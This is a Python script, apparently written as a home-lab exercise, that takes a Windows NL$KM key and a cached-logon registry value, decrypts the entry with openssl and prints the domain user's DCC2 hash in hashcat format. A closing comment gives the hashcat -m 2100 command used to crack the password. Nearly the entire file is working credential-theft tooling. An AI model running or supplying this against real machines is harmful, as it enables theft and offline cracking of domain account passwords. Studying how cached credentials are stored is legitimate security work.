import subprocess

nlkmKey = input("Enter the NL$KM Key: ")
nlkmKey = nlkmKey.replace(" ", "")

#export HKEY_LOCAL_MACHINE\SECURITY\Cache
#ignore all empty entries
#For some unknown reason my domain controller doesn't cache my credentials so i created a second vm and joined it to the domain. Logging in as a domain user to the workstation succesfully caches the credentials in it

nlEntry = input("Enter a NL$<n> value: ")
nlEntry = nlEntry.replace(" ", "")

groupByByte = []
for i in range(0, len(nlEntry), 2): 
    groupByByte.append(nlEntry[i:i+2])


userLength = "".join(groupByByte[0:2])
userLength = bytes.fromhex(userLength)
userLength = int.from_bytes(userLength, byteorder="little")

domainNameLength = "".join(groupByByte[2:4])
domainNameLength = bytes.fromhex(domainNameLength)
domainNameLength = int.from_bytes(domainNameLength, byteorder="little")

effectiveNameLength = "".join(groupByByte[4:6])
fullNameLength = "".join(groupByByte[6:8])

userID = "".join(groupByByte[16:20])
primaryGroupId = "".join(groupByByte[20:24])
groupCount = "".join(groupByByte[24:28])

lastWrite = "".join(groupByByte[32:40])
revision = "".join(groupByByte[40:44])

#UCHAR[16] is the same as UCHAR * 16 so it's 16 UCHARS which makes it 16 bytes
iv = "".join(groupByByte[64:80])
challenge = "".join(groupByByte[80:96])


encryptedPayload = "".join(groupByByte[96:])

#https://docs.openssl.org/4.0/man1/openssl-enc/#options
decryptedPayload = subprocess.run(
    ["openssl", "enc", "-aes-128-cbc", "-d", "-K", nlkmKey, "-iv", iv, "-nopad"],
    input=bytes.fromhex(encryptedPayload),
    capture_output=True,
).stdout

groupByByte = []
decryptedPayloadHex = decryptedPayload.hex()

for i in range(0, len(decryptedPayloadHex), 2): 
    groupByByte.append(decryptedPayloadHex[i:i+2])
    
dcc2Hash = "".join(groupByByte[0:16])
internalData = "".join(groupByByte[16:72])
#Username and domain name:


#domainStart = 72 + userLength #WHY IS THE LAST CHARACTER MISSING? my domain is google.com but the result keeps outputting GOOGL/<username> instead of GOOGLE/<username> 
#print("".join(groupByByte[domainStart:])) I pasted the output to a utf-16le decoder: https://emn178.github.io/online-tools/hex_decode.html i could finally see the problem, the first two bytes are 00 00 which is null character and not the first character of the domain name which is why the last domain character got skipped.

#After ALOT of testing, this solved the problem, i just copied from the source but i don't understand it or why it fixed the problem:
alignedUserLength = (userLength + 3) & ~3 #DWORD ALIGNED (whatever that is supposed to mean)
domainStart = 72 + alignedUserLength

usernameHex = "".join(groupByByte[72:domainStart])
domainNameHex = "".join(groupByByte[domainStart:domainStart + domainNameLength])



#preparing hashcat ready output 
usernameBinary = bytes.fromhex(usernameHex)
username = usernameBinary.decode("utf-16-le").lower() #encoding as utf-16-le and formatting in lowercase is required

domainNameBinary = bytes.fromhex(domainNameHex)
domainName = domainNameBinary.decode("utf-16-le")
print(domainName)
print(domainNameLength)
print(f"Hashcat ready format: {domainName}/{username}:$DCC2$10240#{username}#{dcc2Hash}")


#The script works as intended, i just cracked my password: hashcat -m 2100 --username <path/to/hash> <path/to/wordlist>